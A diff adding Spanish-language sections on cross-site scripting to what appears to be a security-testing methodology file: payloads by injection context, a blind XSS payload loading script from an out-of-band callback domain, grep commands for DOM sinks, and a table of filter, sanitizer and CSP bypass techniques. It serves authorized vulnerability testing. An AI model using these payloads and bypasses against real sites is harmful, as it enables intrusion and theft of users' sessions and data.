@@ -126,6 +126,61 @@ chains_with: [csrf, open-redirect, auth-bypass]
 - Browser devtools (manual) — mandatory for DOM XSS and real execution confirmation.
 - Burp Suite — manual context analysis, CSP evaluator extension.
 
+## Payloads & Detection Patterns
+
+Guía de caza: una familia por contexto de inyección. Confirma siempre ejecución en un browser real;
+un match en curl no es prueba. Para stored/blind, el único camino a `Demonstrated` es un callback
+correlacionado por token en el gate OOB.
+
+| Categoría | Shape | Propósito |
+|---|---|---|
+| HTML body | `<script>alert(document.domain)</script>`, `<svg onload=alert(1)>` | Ejecución directa en contexto HTML |
+| Attribute breakout | `" autofocus onfocus=alert(1) x="`, `'><img src=x onerror=alert(1)>` | Salir del atributo y ejecutar handler |
+| JS string context | `';alert(1)//`, `</script><script>alert(1)</script>` | Romper el literal JS o cerrar el bloque script |
+| URI/href context | `javascript:alert(1)`, `data:text/html,<script>alert(1)</script>` | Scheme ejecutable en `href`/`src` |
+| DOM sink | `#<img src=x onerror=alert(1)>` vía `location.hash` → `innerHTML` | Bug solo cliente, nunca toca el server |
+| Polyglot | `jaVasCript:/*-/*'/*"/**/(/* */oNcliCk=alert() )//` | Dispara en múltiples contextos de una |
+| SVG/upload | `<svg xmlns="http://www.w3.org/2000/svg" onload=alert(1)>` servido inline | XSS almacenado vía archivo |
+| Blind/stored | `"><script src=//TOKEN.<domain>.oast.site></script>` | Confirma ejecución en vista de víctima vía callback |
+
+Surface signals que delatan la clase antes de inyectar:
+- Probe único (`zzXSSMARKER99`) reflejado verbatim o lightly-encoded (revisar en view-source).
+- Sinks en JS cliente: `innerHTML`, `outerHTML`, `document.write`, `insertAdjacentHTML`, `eval`, `dangerouslySetInnerHTML`, `v-html`, `bypassSecurityTrust*`.
+- Sources DOM: `location.hash|search|href`, `document.referrer`, `URLSearchParams`, `postMessage` sin check de `event.origin`.
+- CSP ausente o permisiva (`unsafe-inline`, `*` en `script-src`, sin `base-uri`).
+- `Content-Type` del reflejo: `text/html` ejecuta; `application/json`/`text/plain` no.
+
+```bash
+# mapeo de reflexión: dónde y cómo cae el marcador (contexto)
+curl -s "https://target/search?q=zzXSSMARKER99" | grep -o '.\{30\}zzXSSMARKER99.\{30\}'
+# DOM source->sink en el JS cliente
+curl -s https://target/app.js \
+  | grep -nE "innerHTML|outerHTML|document\.write|insertAdjacentHTML|eval\(|dangerouslySetInnerHTML|location\.(hash|search|href)"
+```
+
+```bash
+# blind/stored XSS con token de callback (gate OOB)
+python3 -m engine.oast token --audit-dir . --purpose blind-xss --vuln-class xss \
+  --target-url https://target/comment --parameter body    # payload_url -> src del <script>
+# planta "><script src=//TOKEN.<domain>.oast.site></script> y luego:
+python3 -m engine.oast poll --audit-dir .                  # hit = ejecutó en la vista de víctima
+```
+
+## Bypass Techniques
+
+Agrupadas por la defensa que evaden; rotar familias antes de declarar un campo seguro.
+
+| Filtro evadido | Técnica | Notas |
+|---|---|---|
+| Blocklist `<script>` | Event handlers `onerror`/`onload`, `<svg>`, `<img>`, `<iframe srcdoc>` | El WAF suele cubrir solo `<script>` |
+| Regex no recursivo | Tags anidados `<scr<script>ipt>`, `<<script>` | El filtro elimina una capa y reconstruye el tag |
+| Case sensitivity | `<ScRiPt>`, `oNeRRor` | Reglas case-sensitive ingenuas |
+| Keyword `alert`/`javascript` | `confirm`/`print`, `top['al'+'ert']`, `eval(atob(...))` | Evita el match textual |
+| HTML entity / encoding | `&#x6a;avascript:`, URL `%3Cimg`, doble encode, overlong UTF-8 | El navegador/cliente JS lo decodifica |
+| Sanitizer (DOMPurify) | mXSS vía namespace confusion (`<math><mtext>`), `<noscript>` reparsing | Mutaciones del parser tras sanitizar |
+| CSP estricta | Gadget en script permitido (JSONP, AngularJS legacy), `<base>` hijack si falta `base-uri` | `report-only` no bloquea; nonce reusado |
+| Filtro server-side | Payload decodificado client-side (`decodeURIComponent` antes de `innerHTML`) | El encoding del server se deshace en el cliente |
+
 ## Root Causes
 
 - Output encoding missing/wrong for context (HTML-encoding a value placed inside a `<script>`
